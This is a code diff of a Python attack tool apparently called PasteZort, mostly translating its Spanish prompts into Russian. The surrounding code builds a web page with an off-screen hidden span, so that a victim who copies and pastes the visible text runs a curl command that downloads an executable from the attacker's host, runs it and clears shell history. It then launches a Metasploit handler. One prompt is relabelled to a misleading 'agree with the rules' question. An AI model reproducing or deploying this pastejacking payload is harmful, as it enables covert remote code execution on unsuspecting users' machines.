@@ -289,8 +289,8 @@ def ShellMacOSX():
 			if os.path.isfile(NombreIndex):
 				os.system("rm /var/www/html/index.html")
 		
-			ip=raw_input("\n   LHOST= ")
-			port=raw_input("   LPORT= ")
+			ip=raw_input("\n   IP-адрес= ")
+			port=raw_input("   Порт(4444)= ")
 
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
  -> Создание нагрузки...
@@ -302,8 +302,8 @@ def ShellMacOSX():
  -> Готово! : """+payload+"""
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
-			mensaje1=raw_input("   Mensaje 1: ")
-			mensaje2=raw_input("   Mensaje 2: ")
+			mensaje1=raw_input("   Сообщение 1: ")
+			mensaje2=raw_input("   Сообщение 2: ")
 			NombreIndex="index.html"
 			job=open(NombreIndex,"w")	
 			job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >;curl -O http://"""+ip+"""/osx."""+extension+""";chmod +x osx."""+extension+""";"""+ejecucion+"""osx."""+extension+""" & history -c;clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
@@ -336,7 +336,7 @@ exploit -j""")
 			archivo.close()
 
 			print '\033[0;39m'
-			iniciar_handler=str(raw_input("   ¿Desea iniciar el handler? (y/n): "))
+			iniciar_handler=str(raw_input("  Согласен с правилами? (y/n): "))
 			if (iniciar_handler == 'y'):
 				print '\033[1;31m'+"""\n-------------------------------------------------------------------
  -> Проверка handler Metasploit...
@@ -344,7 +344,7 @@ exploit -j""")
 				print '\033[0;39m'
 				os.system("msfconsole -r Handler_msf_MacOSX")
 			elif (iniciar_handler == 'n'):
-				print "\n   ¡Completado!\n"
+				print "\n   Готово!\n"
 os.system("clear")
 print """ _________________________________________________________________
 | --------------------------------------------------------------- |
@@ -371,7 +371,7 @@ print'\033[1;31m'+"""-----------------------------------------------------------
 -------------------------------------------------------------------"""
 +os.system("service apache2 start")
 
-print """ -> Это Русская версия PasteZort!
+print """ -> Это Русская версия PasteZort! Но, я перевел в основном только MacOS, но это не конец...
 -------------------------------------------------------------------"""
 print '\033[0;39m'
 OS_Objetivo=int(raw_input("""   Выбор системы:
